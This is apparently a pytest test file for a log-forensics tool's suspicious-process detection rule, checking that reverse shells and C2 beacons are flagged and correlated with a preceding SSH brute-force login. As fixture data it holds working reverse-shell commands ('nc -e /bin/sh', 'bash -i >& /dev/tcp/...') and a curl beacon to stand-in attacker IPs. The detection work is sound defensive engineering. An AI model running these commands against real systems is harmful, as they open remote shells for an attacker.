"""suspicious_process correlation rule (scenario #6).

Turns the process-execution EVIDENCE produced by auditd_parser / ps_parser
into scored FINDINGS: a command whose shape is a reverse shell, C2 beacon or
encoded payload is flagged, and when it follows a brute-forced login within
the window the finding is raised to high confidence (post-compromise
execution).
"""
import pytest

from lfa import db
from lfa.rules.execution import SuspiciousProcessRule


def run_rule(conn, rule, ctx=None):
    return list(rule.run(conn, ctx or {}))


def _exec_event(event_factory, cmd, **over):
    kw = dict(
        category="user_activity",
        subcategory="process_execution",
        description=f"Process executed: {cmd}",
        raw_line=cmd,
        actor_process=cmd.split()[0],
        severity="info",
    )
    kw.update(over)
    return event_factory(**kw)


def test_reverse_shell_execve_is_flagged(tmp_path, event_factory):
    conn = db.open_case(tmp_path / "c.db")
    db.insert_events(conn, [
        _exec_event(event_factory, "nc -e /bin/sh 10.0.0.1 4444"),
    ])
    hits = run_rule(conn, SuspiciousProcessRule())
    assert len(hits) == 1
    f = hits[0]
    assert f.rule_name == "suspicious_process"
    assert f.severity == "high"
    assert "nc -e /bin/sh" in f.plain.what_happened
    assert len(f.event_ids) >= 1
    conn.close()


def test_benign_execution_not_flagged(tmp_path, event_factory):
    conn = db.open_case(tmp_path / "c.db")
    db.insert_events(conn, [
        _exec_event(event_factory, "/usr/bin/ls -la /home"),
        _exec_event(event_factory, "/sbin/init"),
    ])
    assert run_rule(conn, SuspiciousProcessRule()) == []
    conn.close()


def test_c2_beacon_curl_to_ip_is_flagged(tmp_path, event_factory):
    conn = db.open_case(tmp_path / "c.db")
    db.insert_events(conn, [
        _exec_event(event_factory, "curl -s http://203.0.113.9/beacon"),
    ])
    hits = run_rule(conn, SuspiciousProcessRule())
    assert len(hits) == 1
    assert hits[0].severity == "high"
    conn.close()


def test_running_process_snapshot_flagged_without_timestamp(tmp_path, event_factory):
    # ps snapshot: state_finding, no timestamp. Must flag, must not crash.
    conn = db.open_case(tmp_path / "c.db")
    db.insert_events(conn, [
        _exec_event(event_factory, "nc -e /bin/sh 10.0.0.1 4444",
                    subcategory="running_process", event_kind="state_finding",
                    timestamp_utc=None, timestamp_local=None,
                    timestamp_confidence="unknown", severity="medium"),
    ])
    hits = run_rule(conn, SuspiciousProcessRule())
    assert len(hits) == 1
    assert hits[0].plain.confidence == "Medium"  # no timeline to correlate
    conn.close()


def test_execution_after_bruteforce_login_is_high_confidence(tmp_path, event_factory):
    conn = db.open_case(tmp_path / "c.db")
    events = []
    # a brute-force burst from one IP (distinct raw lines / offsets so the
    # event_hash dedupe keeps them as six separate events, like real logs)
    for i in range(6):
        events.append(event_factory(
            subcategory="failed_login", severity="low",
            timestamp_utc=f"2024-03-14T02:0{i}:00+00:00",
            source_ip="203.0.113.9",
            raw_line=f"Mar 14 02:0{i}:00 web1 sshd[1{i}]: Failed password",
            raw_line_offset=100 * i,
            description=f"Failed password attempt {i}"))
    # a successful login from that same IP
    events.append(event_factory(
        subcategory="successful_login", severity="medium",
        timestamp_utc="2024-03-14T02:10:00+00:00", source_ip="203.0.113.9",
        raw_line="Mar 14 02:10:00 web1 sshd[999]: Accepted password",
        raw_line_offset=9000,
        description="Accepted password from 203.0.113.9"))
    # a reverse shell executed 5 minutes later
    events.append(_exec_event(event_factory, "bash -i >& /dev/tcp/203.0.113.9/9001 0>&1",
                              timestamp_utc="2024-03-14T02:15:00+00:00",
                              source_ip=None))
    db.insert_events(conn, events)

    hits = run_rule(conn, SuspiciousProcessRule())
    exec_hits = [h for h in hits if "/dev/tcp" in h.plain.what_happened]
    assert exec_hits, "reverse shell not flagged"
    f = exec_hits[0]
    assert f.plain.confidence == "High"          # correlated with the login
    assert "203.0.113.9" in f.technical_detail    # references the correlated login
    conn.close()
